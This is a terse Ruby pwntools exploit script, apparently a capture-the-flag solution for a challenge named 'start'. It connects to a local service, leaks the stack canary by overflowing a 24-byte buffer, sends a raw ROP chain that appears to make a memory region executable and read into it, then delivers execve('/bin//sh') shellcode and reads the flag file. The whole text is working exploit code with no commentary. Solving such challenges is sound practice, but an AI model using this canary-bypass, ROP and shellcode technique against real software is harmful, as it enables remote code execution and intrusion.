# encoding: ASCII-8BIT
require 'pwn'; context.arch = 'amd64'; z = Sock.new "127.0.0.1", 31338; shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"; z.sendline 'A'*24; z.recvline; canary_leak = z.recvline ; canary_leak = "\x00" +  canary_leak[0..-5]; raw_rop = "\xd5\x05@\x00\x00\x00\x00\x00\x00\xb0l\x00\x00\x00\x00\x00\xf7\x17@\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00v7D\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00`\x0eD\x00\x00\x00\x00\x00\xf6\x02@\x00\x00\x00\x00\x00\xd5\x05@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf7\x17@\x00\x00\x00\x00\x00\x00\xb0l\x00\x00\x00\x00\x00v7D\x00\x00\x00\x00\x00\x17\x00\x00\x00\x00\x00\x00\x00\x00\x03D\x00\x00\x00\x00\x00\xf6\x02@\x00\x00\x00\x00\x00"; buf = 0x6cb000; payload = 'A'*24; payload += canary_leak; payload += 'B'*8; payload += raw_rop; payload += p64(buf); z.sendline payload; z.recvline ; z.sendline "exit"; z.sendline shellcode;  z.sendline("cat /home/start/flag");  puts z.recv(300);